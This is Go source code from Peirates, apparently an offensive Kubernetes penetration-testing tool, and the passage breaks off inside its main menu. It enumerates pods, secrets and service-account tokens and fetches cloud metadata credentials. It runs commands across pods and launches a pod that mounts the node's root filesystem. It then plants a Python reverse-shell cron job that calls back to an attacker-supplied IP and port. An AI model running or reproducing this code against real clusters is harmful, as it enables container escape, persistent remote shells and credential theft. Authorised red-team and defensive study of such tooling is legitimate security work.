// Peirates - an Attack tool for Kubernetes clusters
//
// You need to use "package main" for executables
//
// BTW always run `go fmt` before you check in code. go fmt is law.
//
package peirates

// Imports. If you don't use an import that's an error so
// I haven't imported json yet.
// Also, number one rule of Go: Try to stick to the
// standard library as much as possible
import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"flag" // Command line flag parsing
	"fmt"  // String formatting (Printf, Sprintf)
	"io"
	"io/ioutil" // Utils for dealing with IO streams
	"log"       // Logging utils
	"math/rand" // Random module for creating random string building
	"os"        // Environment variables ...

	// HTTP client/server
	"net/http"
	"os/exec"
	"regexp"
	"strings"
	"time" // Time modules

	// kubernetes client
	kubectl "k8s.io/kubernetes/pkg/kubectl/cmd"
)

// getPodList returns an array of running pod names, parsed from "kubectl -n namespace get pods"
func getPodList(connectionString ServerInfo) []string {

	if !kubectlAuthCanI(connectionString, "get", "pods") {
		println("Permission Denied: your service account isn't allowed to get pods")
		return []string{}
	}

	var pods []string

	getPodsRaw, _, err := runKubectlSimple(connectionString, "get", "pods")
	if err != nil {
		log.Fatal(err)
	}
	// Iterate over kubectl get pods, stripping off the first line which matches NAME and then grabbing the first column

	lines := strings.Split(string(getPodsRaw), "\n")
	for _, line := range lines {
		matched, err := regexp.MatchString(`^\s*$`, line)
		if err != nil {
			log.Fatal(err)
		}
		if !matched {
			//added checking to only enumerate running pods
			if strings.Fields(line)[2] == "Running" {
				pod := strings.Fields(line)[0]
				if pod != "NAME" {
					pods = append(pods, pod)
				}
			}
		}
	}

	return pods
}

// Get the names of the available Secrets from the current namespace and a list of service account tokens
func getSecretList(connectionString ServerInfo) ([]string, []string) {

	var secrets []string
	var service_account_tokens []string

	if !kubectlAuthCanI(connectionString, "get", "secrets") {
		println("Permission Denied: your service account isn't allowed to get secrets")
		return []string{}, []string{}
	}

	getSecretsRaw, _, err := runKubectlSimple(connectionString, "get", "secrets")
	if err != nil {
		log.Fatal(err)
	}
	// Iterate over kubectl get secrets, stripping off the first line which matches NAME and then grabbing the first column

	lines := strings.Split(string(getSecretsRaw), "\n")
	for _, line := range lines {
		matched, err := regexp.MatchString(`^\s*$`, line)
		if err != nil {
			log.Fatal(err)
		}
		if !matched {
			//added checking to note which secrets are service account tokens
			fields := strings.Fields(line)
			secret := fields[0]
			// Check for header row
			if secret != "NAME" {
				secrets = append(secrets, secret)
				if fields[1] == "kubernetes.io/service-account-token" {
					service_account_tokens = append(service_account_tokens, secret)
				}
			}
		}
	}

	return secrets, service_account_tokens
}

// GetGCPBearerTokenFromMetadataAPI takes the name of a GCP service account and returns a token
func GetGCPBearerTokenFromMetadataAPI(account string) string {
	client := &http.Client{}
	// TURN THIS INTO A FUNCTION SO WE CAN PARSE the ones we want
	url := "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" + account + "/token"
	req_token, err := http.NewRequest("GET", url, nil)
	req_token.Header.Add("Metadata-Flavor", "Google")
	response, err := client.Do(req_token)
	if err != nil {
		println("Error - could not perform request ", url)
	}
	defer response.Body.Close()
	body, err := ioutil.ReadAll(response.Body)
	// Body will look like this, unless error has occurred: {"access_token":"xxxxxxx","expires_in":2511,"token_type":"Bearer"}
	// TODO: Add a check for a 200 status code
	// Split the body on "" 's for now
	// TODO: Parse this as JSON
	token_elements := strings.Split(string(body), "\"")
	if token_elements[1] == "access_token" {
		return (token_elements[3])
	} else {
		println("Error - could not find token in returned body text: ", string(body))
		return "ERROR"
	}
}

//
// getHostname runs kubectl with connection string to get hostname from pod
// In the medium term, this function will disappear
//
func getHostname(connectionString ServerInfo, PodName string) string {

	hostname, _, err := runKubectlSimple(connectionString, "exec", "-it", PodName, "hostname")
	if err != nil {
		fmt.Println("- Checking for hostname of pod "+PodName+" failed: ", err)
		return "- Pod command exec failed for " + PodName + "\n"
	} else {
		return "+ Pod discovered: " + string(hostname)
	}
}

// SwitchNamespace switches the current ServerInfo.Namespace to one entered by the user.
func SwitchNamespace(connectionString *ServerInfo) bool {
	var input string

	println("\nEnter namespace to switch to or hit enter to maintain current namespace: ")
	fmt.Scanln(&input)
	if input != "" {
		connectionString.Namespace = input
	}
	return true
}

// runKubectl executes the kubectl library internally, allowing us to use the
// Kubernetes API and requiring no external binaries.
//
// runKubectl takes and io.Reader and two io.Writers, as well as a command to run in cmdArgs.
// The kubectl library will read from the io.Reader, representing stdin, and write its stdout and stderr via the corresponding io.Writers.
//
// runKubectl returns an error string, which indicates internal kubectl errors.
//
// NOTE: You should generally use runKubectlSimple(), which calls runKubectlWithConfig, which calls this.
func runKubectl(stdin io.Reader, stdout, stderr io.Writer, cmdArgs ...string) error {
	// Based on code from https://github.com/kubernetes/kubernetes/blob/2e0e1681a6ca7fe795f3bd5ec8696fb14687b9aa/cmd/kubectl/kubectl.go#L44

	// Set up a function to handle the case where we've been running for over 10 seconds
	// 10 seconds is an entirely arbitrary timeframe, adjust it if needed.
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	go func() {
		// Since this always keeps cmdArgs alive in memory for at least 10 seconds, there is the
		// potential for this to lead to excess memory usage if kubectl is run an astronimcal number
		// of times within the timeout window. I don't expect this to be an issue, but if it is, I
		// recommend a looping <sleeptime> iterations with a 1 second sleep between each iteration,
		// allowing the routine to exit earlier when possible.
		time.Sleep(10 * time.Second)
		select {
		case <-ctx.Done():
			return
		default:
			log.Fatalf(
				"\nKubectl took too long! This usually happens because the remote IP is wrong.\n"+
					"Check that you've passed the right IP address with -i. If that doesn't help,\n"+
					"and you're running in a test environment, try restarting the entire cluster.\n"+
					"\n"+
					"To help you debug, here are the arguments that were passed to peirates:\n"+
					"\t%s\n"+
					"\n"+
					"And here are the arguments that were passed to the failing kubectl command:\n"+
					"\t%s\n",
				os.Args,
				append([]string{"kubectl"}, cmdArgs...))
			return
		}
	}()

	// NewKubectlCommand adds the global flagset for some reason, so we have to
	// copy it, temporarily replace it, and then restore it.
	oldFlagSet := flag.CommandLine
	flag.CommandLine = flag.NewFlagSet("kubectl", flag.ContinueOnError)
	cmd := kubectl.NewKubectlCommand(stdin, stdout, stderr)
	flag.CommandLine = oldFlagSet
	cmd.SetArgs(cmdArgs)
	return cmd.Execute()
}

// runKubectlWithConfig takes a server config, and a list of arguments. It executes kubectl internally,
// setting the namespace, token, certificate authority, and server based on the provided config, and
// appending the supplied arguments to the end of the command.
//
// NOTE: You should generally use runKubectlSimple() to call this.
func runKubectlWithConfig(cfg ServerInfo, stdin io.Reader, stdout, stderr io.Writer, cmdArgs ...string) error {
	connArgs := []string{
		"-n", cfg.Namespace,
		"--token=" + cfg.Token,
		"--certificate-authority=" + cfg.CAPath,
		"--server=https://" + cfg.RIPAddress + ":" + cfg.RPort,
	}
	return runKubectl(stdin, stdout, stderr, append(connArgs, cmdArgs...)...)
}

// runKubectlSimple executes runKubectlWithConfig, but supplies nothing for stdin, and aggregates
// the stdout and stderr streams into byte slices. It returns (stdout, stderr, execution error).
//
// NOTE: This function is what you want to use most of the time, rather than runKubectl() and runKubectlWithConfig().
func runKubectlSimple(cfg ServerInfo, cmdArgs ...string) ([]byte, []byte, error) {
	stdin := strings.NewReader("")
	stdout := bytes.Buffer{}
	stderr := bytes.Buffer{}

	err := runKubectlWithConfig(cfg, stdin, &stdout, &stderr, cmdArgs...)

	return stdout.Bytes(), stderr.Bytes(), err
}

func kubectlAuthCanI(cfg ServerInfo, cmdArgs ...string) bool {
	authArgs := []string{"auth", "can-i"}
	out, _, err := runKubectlSimple(cfg, append(authArgs, cmdArgs...)...)
	if err != nil {
		return false
	}
	var canYouDoTheThing string
	// Extract the first word
	fmt.Sscan(string(out), &canYouDoTheThing)
	return canYouDoTheThing == "yes"
}

// canCreatePods() runs kubectl to check if current token can create a pod
func canCreatePods(connectionString ServerInfo) bool {
	return kubectlAuthCanI(connectionString, "create", "pod")
}

// inAPod() attempts to determine if we are running in a pod.
// Long-term, this will likely go away
func inAPod(connectionString ServerInfo) bool {

	if os.Getenv("KUBERNETES_SERVICE_HOST") != "" {
		println("[+] You may be in a Kubernetes pod. API Server to be found at: ", os.Getenv("KUBERNETES_SERVICE_HOST"))
		return true
	} else {
		println("[-] You may not be in a Kubernetes pod. Press ENTER to continue.")
		var input string
		fmt.Scanln(&input)
		return false
	}
}

// PrintNamespaces prints the output of kubectl get namespaces, but also returns the list of active namespaces
func PrintNamespaces(connectionString ServerInfo) []string {

	if !kubectlAuthCanI(connectionString, "get", "namespaces") {
		println("Permission Denied: your service account isn't allowed to get namespaces")
		return []string{}
	}

	var namespaces []string

	// TODO: Add checking to make sure you're authorized to get namespaces

	NamespacesRaw, _, err := runKubectlSimple(connectionString, "get", "namespaces")
	if err != nil {
		log.Fatal(err)
	}
	// Iterate over kubectl get namespaces, stripping off the first line which matches NAME and then grabbing the first column

	lines := strings.Split(string(NamespacesRaw), "\n")

	for _, line := range lines {
		println(line)
		matched, err := regexp.MatchString(`^\s*$`, line)
		if err != nil {
			log.Fatal(err)
		}
		if !matched {
			// Get rid of blank lines
			if strings.Fields(line)[1] == "Active" {
				namespace := strings.Fields(line)[0]
				if namespace != "NAME" {
					namespaces = append(namespaces, namespace)
				}
			}
		}
	}

	return namespaces
}

func getListOfPods(connectionString ServerInfo) {
	runningPods := getPodList(connectionString)
	for _, listpod := range runningPods {
		fmt.Println("Pod Name: " + listpod)
	}

}

// execInAllPods() runs kubeData.command in all running pods
func execInAllPods(connectionString ServerInfo, command string) {
	if !kubectlAuthCanI(connectionString, "exec") {
		println("Permission Denied: your service account isn't allowed to exec")
		return
	}
	runningPods := getPodList(connectionString)

	for _, execPod := range runningPods {
		execInPodOut, _, err := runKubectlSimple(connectionString, "exec", "-it", execPod, "--", "/bin/sh", "-c", command)
		if err != nil {
			fmt.Println("[-] Executing "+command+" in Pod "+execPod+" failed: ", err)
		} else {
			fmt.Println("[+] Executing " + command + " in Pod " + execPod + " succeded: ")
			fmt.Println("\t" + string(execInPodOut))
		}
	}

}

// execInListPods() runs kubeData.command in all pods in kubeData.list
func execInListPods(connectionString ServerInfo, pods []string, command string) {
	if !kubectlAuthCanI(connectionString, "exec") {
		println("Permission Denied: your service account isn't allowed to exec")
		return
	}

	fmt.Println("+ Running supplied command in list of pods")
	for _, execPod := range pods {

		execInPodOut, _, err := runKubectlSimple(connectionString, "exec", "-it", execPod, "--", "/bin/sh", "-c", command)
		if err != nil {
			fmt.Println("[-] Executing "+command+" in Pod "+execPod+" failed: ", err)
		} else {
			fmt.Println("[+] Executing " + command + " in Pod " + execPod + " succeded: ")
			fmt.Println("\t" + string(execInPodOut))
		}
	}

}

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// Added mountFS code to create yaml file drop to disk and create a pod.    |
//--------------------------------------------------------------------------|

// randSeq generates a LENGTH length string of random lowercase letters.
func randSeq(length int) string {
	letters := []rune("abcdefghijklmnopqrstuvwxyz")
	b := make([]rune, length)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

// Used by mountRootfs
type MountInfo struct {
	yamlBuild string
	image     string
	namespace string
}

// Used for JSON parsing
type KubeRoles struct {
	APIVersion string `json:"apiVersion"`
	Items      []struct {
		APIVersion string `json:"apiVersion"`
		Kind       string `json:"kind"`
		Metadata   struct {
			Annotations struct {
				KubectlKubernetesIoLastAppliedConfiguration string `json:"kubectl.kubernetes.io/last-applied-configuration"`
			} `json:"annotations"`
			CreationTimestamp time.Time `json:"creationTimestamp"`
			Name              string    `json:"name"`
			Namespace         string    `json:"namespace"`
			ResourceVersion   string    `json:"resourceVersion"`
			SelfLink          string    `json:"selfLink"`
			UID               string    `json:"uid"`
		} `json:"metadata"`
		Rules []struct {
			APIGroups []string `json:"apiGroups"`
			Resources []string `json:"resources"`
			Verbs     []string `json:"verbs"`
		} `json:"rules"`
	} `json:"items"`
	Kind     string `json:"kind"`
	Metadata struct {
		ResourceVersion string `json:"resourceVersion"`
		SelfLink        string `json:"selfLink"`
	} `json:"metadata"`
}

// Populated by GetPodsInfo (JSON parsing from kubectl get pods)
type PodDetails struct {
	APIVersion string `json:"apiVersion"`
	Items      []struct {
		APIVersion string `json:"apiVersion"`
		Kind       string `json:"kind"`
		Metadata   struct {
			Annotations struct {
				KubectlKubernetesIoLastAppliedConfiguration string `json:"kubectl.kubernetes.io/last-applied-configuration"`
			} `json:"annotations"`
			CreationTimestamp time.Time `json:"creationTimestamp"`
			Labels            struct {
				App string `json:"app"`
			} `json:"labels"`
			Name            string `json:"name"`
			Namespace       string `json:"namespace"`
			ResourceVersion string `json:"resourceVersion"`
			SelfLink        string `json:"selfLink"`
			UID             string `json:"uid"`
		} `json:"metadata"`
		Spec struct {
			Containers []struct {
				Image           string `json:"image"`
				ImagePullPolicy string `json:"imagePullPolicy"`
				Name            string `json:"name"`
				Ports           []struct {
					ContainerPort int    `json:"containerPort"`
					Protocol      string `json:"protocol"`
				} `json:"ports"`
				Resources struct {
				} `json:"resources"`
				TerminationMessagePath   string `json:"terminationMessagePath"`
				TerminationMessagePolicy string `json:"terminationMessagePolicy"`
				VolumeMounts             []struct {
					MountPath string `json:"mountPath"`
					Name      string `json:"name"`
					ReadOnly  bool   `json:"readOnly"`
				} `json:"volumeMounts"`
			} `json:"containers"`
			DNSPolicy    string `json:"dnsPolicy"`
			NodeName     string `json:"nodeName"`
			NodeSelector struct {
				KubernetesIoHostname string `json:"kubernetes.io/hostname"`
			} `json:"nodeSelector"`
			RestartPolicy   string `json:"restartPolicy"`
			SchedulerName   string `json:"schedulerName"`
			SecurityContext struct {
			} `json:"securityContext"`
			ServiceAccount                string `json:"serviceAccount"`
			ServiceAccountName            string `json:"serviceAccountName"`
			TerminationGracePeriodSeconds int    `json:"terminationGracePeriodSeconds"`
			Tolerations                   []struct {
				Effect            string `json:"effect"`
				Key               string `json:"key"`
				Operator          string `json:"operator"`
				TolerationSeconds int    `json:"tolerationSeconds"`
			} `json:"tolerations"`
			Volumes []struct {
				HostPath struct {
					Path string `json:"path"`
					Type string `json:"type"`
				} `json:"hostPath,omitempty"`
				Name   string `json:"name"`
				Secret struct {
					DefaultMode int    `json:"defaultMode"`
					SecretName  string `json:"secretName"`
				} `json:"secret,omitempty"`
			} `json:"volumes"`
		} `json:"spec"`
		Status struct {
			Conditions []struct {
				LastProbeTime      interface{} `json:"lastProbeTime"`
				LastTransitionTime time.Time   `json:"lastTransitionTime"`
				Status             string      `json:"status"`
				Type               string      `json:"type"`
			} `json:"conditions"`
			ContainerStatuses []struct {
				ContainerID string `json:"containerID"`
				Image       string `json:"image"`
				ImageID     string `json:"imageID"`
				LastState   struct {
					Terminated struct {
						ContainerID string    `json:"containerID"`
						ExitCode    int       `json:"exitCode"`
						FinishedAt  time.Time `json:"finishedAt"`
						Reason      string    `json:"reason"`
						StartedAt   time.Time `json:"startedAt"`
					} `json:"terminated"`
				} `json:"lastState"`
				Name         string `json:"name"`
				Ready        bool   `json:"ready"`
				RestartCount int    `json:"restartCount"`
				State        struct {
					Running struct {
						StartedAt time.Time `json:"startedAt"`
					} `json:"running"`
				} `json:"state"`
			} `json:"containerStatuses"`
			HostIP    string    `json:"hostIP"`
			Phase     string    `json:"phase"`
			PodIP     string    `json:"podIP"`
			QosClass  string    `json:"qosClass"`
			StartTime time.Time `json:"startTime"`
		} `json:"status"`
	} `json:"items"`
	Kind     string `json:"kind"`
	Metadata struct {
		ResourceVersion string `json:"resourceVersion"`
		SelfLink        string `json:"selfLink"`
	} `json:"metadata"`
}

type Secret_Details struct {
	Data []struct {
		Namespace string `json:"namespace"`
		Token     string `json:"token"`
	}
	Metadata struct {
		Name string `json:"name"`
	}
	SecretType string `json:"type"`
}

// GetPodsInfo() gets details for all pods in json output and stores in PodDetails struct
func GetPodsInfo(connectionString ServerInfo, podDetails *PodDetails) {

	if !kubectlAuthCanI(connectionString, "get", "pods") {
		println("Permission Denied: your service account isn't allowed to get pods")
		return
	}

	fmt.Println("+ Getting details for all pods")
	podDetailOut, _, err := runKubectlSimple(connectionString, "get", "pods", "-o", "json")
	println(string(podDetailOut))
	if err != nil {
		fmt.Println("[-] Unable to retrieve details from this pod: ", err)
	} else {
		fmt.Println("[+] Retrieving details for all pods was successful: ")
		err := json.Unmarshal(podDetailOut, &podDetails)
		if err != nil {
			fmt.Println("[-] Error unmarshaling data: ", err)
		}
	}
}

// GetHostMountPoints prints all pods' host volume mounts parsed from the Spec.Volumes pod spec by GetPodsInfo()
func GetHostMountPoints(podInfo PodDetails) {
	fmt.Println("+ Getting all host mount points for pods in current namespace")
	for _, item := range podInfo.Items {
		// fmt.Println("+ Host Mount Points for Pod: " + item.Metadata.Name)
		for _, volume := range item.Spec.Volumes {
			if volume.HostPath.Path != "" {
				fmt.Println("\tHost Mount Point: " + string(volume.HostPath.Path) + " found for pod " + item.Metadata.Name)
			}
		}
	}
}

// GetHostMountPointsForPod prints a single pod's host volume mounts parsed from the Spec.Volumes pod spec by GetPodsInfo()
func GetHostMountPointsForPod(podInfo PodDetails, pod string) {
	fmt.Println("+ Getting all Host Mount Points only for pod: " + pod)
	for _, item := range podInfo.Items {
		if item.Metadata.Name == pod {
			for _, volume := range item.Spec.Volumes {
				if volume.HostPath.Path != "" {
					fmt.Println("\tHost Mount Point: " + string(volume.HostPath.Path))
				}
			}
		}
	}
}

// GetRoles() enumerates all roles in use on the cluster (in the default namespace).
// It parses all roles into a KubeRoles object.
func GetRoles(connectionString ServerInfo, kubeRoles *KubeRoles) {
	fmt.Println("+ Getting all Roles")
	rolesOut, _, err := runKubectlSimple(connectionString, "get", "role", "-o", "json")
	if err != nil {
		fmt.Println("[-] Unable to retrieve roles from this pod: ", err)
	} else {
		fmt.Println("[+] Retrieving roles was successful: ")
		err := json.Unmarshal(rolesOut, &kubeRoles)
		if err != nil {
			fmt.Println("[-] Error unmarshaling data: ", err)
		}

	}
}

func MountRootFS(allPodsListme []string, connectionString ServerInfo, callbackIP, callbackPort string) {
	var MountInfoVars = MountInfo{}
	// BUG: this routine seems to create the same pod name every time, which makes it so it can't run twice.

	// First, confirm we're allowed to create pods
	if !canCreatePods(connectionString) {
		println("AUTHORIZATION: this token isn't allowed to create pods in this namespace")
		return
	}
	// TODO: changing parsing to occur via JSON
	// TODO: check that image exists / handle failure by trying again with the next youngest pod's image or a named pod's image

	// Approach 1: Try to get the image file for my own pod
	//./kubectl describe pod `hostname`| grep Image:
	hostname := os.Getenv("HOSTNAME")
	approach1_success := false
	var image string
	podDescriptionRaw, _, err := runKubectlSimple(connectionString, "describe", "pod", hostname)
	if err != nil {
		approach1_success = false
		println("DEBUG: describe pod didn't work")
	} else {
		podDescriptionLines := strings.Split(string(podDescriptionRaw), "\n")
		for _, line := range podDescriptionLines {
			start := strings.Index(line, "Image:")
			if start != -1 {
				// Found an Image line -- now get the image
				image = strings.TrimSpace(line[start+6:])
				println("Found image :", image)
				approach1_success = true

				MountInfoVars.image = image
			}
		}
		if !approach1_success {
			println("DEBUG: did not find an image line in your pod's definition.")
		}
	}

	if approach1_success {
		println("Got image definition from own pod.")
	} else {
		// Approach 2 - use the most recently staged running pod
		//
		// TODO: re-order the list and stop the for loop as soon as we have the first running or as soon as we're able to make one of these work.

		// Future version of approach 2:
		// 	Let's make something to mount the root filesystem, but not pick a deployment.  Rather,
		// it should populate a list of all pods in the current namespace, then iterate through
		// images trying to find one that has a shell.

		// Here's the useful part of that data.

		// type PodDetails struct {
		// 	Items      []struct {
		// 		Metadata   struct {
		// 			Name            string `json:"name"`
		// 			Namespace       string `json:"namespace"`
		// 		} `json:"metadata"`
		// 		Spec struct {
		// 			Containers []struct {
		// 				Image           string `json:"image"

		println("Getting image from the most recently-staged pod in thie namespace")
		getImagesRaw, _, err := runKubectlSimple(connectionString, "get", "pods", "-o", "wide", "--sort-by", "metadata.creationTimestamp")
		if err != nil {
			//log.Fatal(err)
			println("ERROR: Could not get pods")
			return
		}
		getImageLines := strings.Split(string(getImagesRaw), "\n")
		for _, line := range getImageLines {
			matched, err := regexp.MatchString(`^\s*$`, line)
			if err != nil {
				println("ERROR: could not parse pod list")
				return
				// log.Fatal(err)
			}
			if !matched {
				//added checking to only enumerate running pods
				// BUG: Did we do this? Check.
				MountInfoVars.image = strings.Fields(line)[7]
				//fmt.Println("[+] This is the MountInfoVars.Image output: ", MountInfoVars.image)
			}
		}
	}

	//creat random string
	rand.Seed(time.Now().UnixNano())
	randomString := randSeq(6)

	// Create Yaml File
	MountInfoVars.yamlBuild = fmt.Sprintf(`apiVersion: v1
kind: Pod
metadata:
  annotations:
  labels:
  name: attack-pod-%s
  namespace: %s
spec:
  containers:
  - image: %s
    imagePullPolicy: IfNotPresent
    name: attack-container
    volumeMounts:
    - mountPath: /root
      name: mount-fsroot-into-slashroot
  volumes:
  - name: mount-fsroot-into-slashroot
    hostPath:
       path: /
`, randomString, connectionString.Namespace, MountInfoVars.image)

	// Write yaml file out to current directory
	ioutil.WriteFile("attack-pod.yaml", []byte(MountInfoVars.yamlBuild), 0700)

	_, _, err = runKubectlSimple(connectionString, "apply", "-f", "attack-pod.yaml")
	if err != nil {
		println("Pod did not stage successfully.")
		return
	} else {
		attackPodName := "attack-pod-" + randomString
		println("[+] Executing code in " + attackPodName + " to get its underlying host's root password hash - please wait for Pod to stage")
		time.Sleep(5 * time.Second)
		//shadowFileBs, _, err := runKubectlSimple(connectionString, "exec", "-it", attackPodName, "grep", "root", "/root/etc/shadow")
		//_, _, err := runKubectlSimple(connectionString, "exec", "-it", attackPodName, "grep", "root", "/root/etc/shadow")
		stdin := strings.NewReader("*  *    * * *   root    python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + callbackIP + "\"," + callbackPort + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\", \"-i\"]);'\n")
		stdout := bytes.Buffer{}
		stderr := bytes.Buffer{}
		err := runKubectlWithConfig(connectionString, stdin, &stdout, &stderr, "exec", "-it", attackPodName, "--", "/bin/sh", "-c", "cat >> /root/etc/crontab")

		if err != nil {
			// BUG: when we remove that timer above and thus get an error condition, program crashes during the runKubectlSimple instead of reaching this message
			println("Exec into that pod failed. If your privileges do permit this, the pod have need more time.  Use this main menu option to try again: Run command in one or all pods in this namespace.")
			return
		} else {
			println("Netcat callback added sucessfully.")
			//println(string(shadowFileBs))
		}
	}
	//out, err = exec.Command("").Output()
	//if err != nil {
	//	fmt.Println("Token location error: ", err)
	//}
	//fmt.Println(out)
}

func clear_screen() {
	fmt.Print("Press Enter to Proceed .....")
	var input string
	fmt.Scanln(&input)
	//fmt.Print(input)
	c := exec.Command("clear")
	c.Stdout = os.Stdout
	c.Run()
}

// SERVICE ACCOUNT MANAGEMENT
type ServiceAccount struct {
	Name            string    // Service account name
	Token           string    // Service account token
	DiscoveryTime   time.Time // Time the service account was discovered
	DiscoveryMethod string    // How the service account was discovered (file on disk, secrets, user input, etc.)
}

// makeNewServiceAccount creates a new service account with the provided name,
// token, and discovery method, while setting the DiscoveryTime to time.Now()
func makeNewServiceAccount(name, token, discoveryMethod string) ServiceAccount {
	return ServiceAccount{
		Name:            name,
		Token:           token,
		DiscoveryTime:   time.Now(),
		DiscoveryMethod: discoveryMethod,
	}
}

func readServiceAccountFromCommandLine() ServiceAccount {
	println("\nPlease paste in a new service account token or hit ENTER to maintain current token.")
	serviceAccount := ServiceAccount{
		Name:            "",
		Token:           "",
		DiscoveryTime:   time.Now(),
		DiscoveryMethod: "User Input",
	}
	reader := bufio.NewReader(os.Stdin)
	println("\nWhat do you want to name this service account?")
	serviceAccount.Name, _ = reader.ReadString('\n')
	// Trim newline
	serviceAccount.Name = serviceAccount.Name[:len(serviceAccount.Name)-1]
	println("\nPaste the service account token and hit ENTER:")
	serviceAccount.Token, _ = reader.ReadString('\n')
	// Trim newline
	serviceAccount.Token = serviceAccount.Token[:len(serviceAccount.Token)-1]

	return serviceAccount
}

func assignServiceAccountToConnection(account ServiceAccount, info *ServerInfo) {
	info.TokenName = account.Name
	info.Token = account.Token
}

func banner(connectionString ServerInfo) {

	name, err := os.Hostname()
	if err != nil {
		panic(err)
	}

	println(`________________________________________
|  ___  ____ _ ____ ____ ___ ____ ____ |
|  |__] |___ | |__/ |__|  |  |___ [__  |
|  |    |___ | |  \ |  |  |  |___ ___] |
|______________________________________|
,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
,,,,,,,,,,,,,.............:,,,,,,,,,,,,,
,,,,,,,,,,...,IIIIIIIIIII+...,,,,,,,,,,,
,,,,,,,:..~IIIIIIIIIIIIIIIIII...,,,,,,,,
,,,,,,..?IIIIIII.......IIIIIIII..,,,,,,,
,,,,,..IIIIIIII...II?...?IIIIIII,..,,,,,
,,,:..IIIIIIII..:IIIIII..?IIIIIIII..,,,,
,,,..IIIIIIIII..IIIIIII...IIIIIIII7.:,,,
,,..IIIIIIIII.............IIIIIIIII..,,,
,,.=IIIIIIII...~~~~~~~~~...IIIIIIIII..,,
,..IIIIIIII...+++++++++++,..+IIIIIII..,,
,..IIIIIII...+++++++++++++:..~IIIIII..,,
,..IIIIII...++++++:++++++++=..,IIIII..,,
,..IIIII...+....,++.++++:+.++...IIII..,,
,,.+IIII...+..,+++++....+,.+...IIIII..,,
,,..IIIII...+++++++++++++++...IIIII..:,,
,,,..IIIII...+++++++++++++...IIIII7..,,,
,,,,.,IIIII...+++++++++++...?IIIII..,,,,
,,,,:..IIIII...............IIIII?..,,,,,
,,,,,,..IIIII.............IIIII..,,,,,,,
,,,,,,,,..7IIIIIIIIIIIIIIIII?...,,,,,,,,
,,,,,,,,,:...?IIIIIIIIIIII....,,,,,,,,,,
,,,,,,,,,,,,:.............,,,,,,,,,,,,,,
,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
________________________________________

   Peirates v1.08 by InGuardians
   https://www.inguardians.com/labs/

----------------------------------------------------------------`)

	if connectionString.Token != "" {

		fmt.Printf("[+] Service Account Loaded: %s\n", connectionString.TokenName)
	}
	var have_ca bool = false
	if connectionString.CAPath != "" {
		have_ca = true
	}
	fmt.Printf("[+] Certificate Authority Certificate: %t\n", have_ca)
	fmt.Printf("[+] Kubernetes API Server: %s:%s\n", connectionString.RIPAddress, connectionString.RPort)
	fmt.Println("[+] Current hostname:", name)
	fmt.Println("[+] Current namespace:", connectionString.Namespace)

}

func ReadFile(filename string) {
	data, err := ioutil.ReadFile(filename)
	if err != nil {
		log.Panicf("failed reading data from file: %s", err)
	}
	fmt.Printf("\nFile Content: %s", data)
}

//------------------------------------------------------------------------------------------------------------------------------------------------

func PeiratesMain() {

	// Create a global variable named "connectionString" initialized to
	// default values
	connectionString := ParseLocalServerInfo()
	cmdOpts := CommandLineOptions{connectionConfig: &connectionString}
	//var kubeRoles KubeRoles
	var podInfo PodDetails

	// Store all acquired namespaces for this cluster in a global variable, populated and refreshed by PrintNamespaces()
	var Namespaces []string
	println(Namespaces)

	//kubeData.arg =""
	//kubeData.list = {}

	// Run the option parser to initialize connectionStrings
	parseOptions(&cmdOpts)

	// List of current service accounts
	serviceAccounts := []ServiceAccount{makeNewServiceAccount(connectionString.TokenName, connectionString.Token, "Loaded at startup")}

	// Check environment variables - see KUBERNETES_SERVICE_HOST and KUBERNETES_SERVICE_PORT
	// Watch the documentation on these variables for changes:
	// https://kubernetes.io/docs/concepts/containers/container-environment-variables/

	// BUG: confirm that this does the right thing when not in a pod.
	if inAPod(connectionString) {
		println("+ You are in a pod.")
	} else {
		println("- You are not in a Kubernetes pod.")
	}

	//allPods := getPodList(connectionString)

	var input int
	for ok := true; ok; ok = (input != 2) {
		banner(connectionString)
		println(`----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service accounts
[2] List and/or change namespaces
[3] Get list of pods
[4] Get complete info on all pods (json)
[5] Get list of secrets
[6] Get a service account token from a secret
[7] Get a list of roles for this service account [not yet implemented]
[8] Get a list of roles available on the cluster [implemented but not connected to menu]
[9] Get a list of abilities for a role [not yet implemented]
----------------------------------------------------------------
Vulnerabilities and Misconfiguration Searching |
-----------------------------------------------+
[10] Check all pods for volume mounts
[11] Launch a pod mounting its node's host filesystem and set up a netcat callback
[12] Request list of pods from a Kubelet [not yet implemented]
------------------------------------------------+
Cloud-specific Credential Gathering             |
------------------------------------------------+
[13] Request IAM credentials from AWS Metadata API [AWS only]
[14] Request IAM credentials from GCP Metadata API [GCP only]
[15] Request kube-env from GCP Metadata API [GCP only]
[16] Pull Kubernetes service account tokens from S3 [AWS only] [not yet implemented]
[17] Pull Kubernetes service account tokens from GCS [GCP only] [not yet implemented]
------+
Pivot |
------+
[20] List service accounts acquired [not yet implemented]
[21] Switch to an acquired service account [not yet implemented]
[30] Run command in one or all pods in this namespace 
[33] Run a command in a pod via a Kubelet [not yet implemented]
-----+
Misc |
-----+
[98] Shell out to bash (not yet implemented)
[99] Build YAML Files (not yet implemented)
[exit] Exit Peirates 
----------------------------------------------------------------
Peirates:># `)

		var input string
		var user_response string
		fmt.Scanln(&input)
		// Peirates MAIN MENU
		switch input {

		// exit
		case "exit":
			os.Exit(0)

		// [1] Enter a different service account token
		case "1":
			fmt.Printf("\nCurrent primary service account: %s // %s\n\n[1] List service accounts\n[2] Select primary service account\n[3] Add new service account\n[4] Export service accounts to JSON\n[5] Import service accounts from JSON\n", connectionString.TokenName, connectionString.Token)
			fmt.Scanln(&input)
			switch input {
			case "1":
				println("\nAvailable Service Accounts:")
				for i, account := range serviceAccounts {
					if account.Name == connectionString.TokenName {
